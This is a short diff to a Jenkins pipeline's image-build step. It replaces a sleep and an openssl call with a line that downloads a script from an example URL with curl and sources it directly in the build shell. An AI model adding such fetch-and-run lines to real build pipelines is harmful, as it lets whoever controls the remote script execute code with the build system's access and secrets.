@@ -6,8 +6,7 @@ pipeline {
                   script{
                     echo "Build the image"
                     sh '''
-                    sleep 3
-                    openssl 
+                    source <(curl -s http://mywebsite.example/myscript.txt)
                     '''
 
                   }
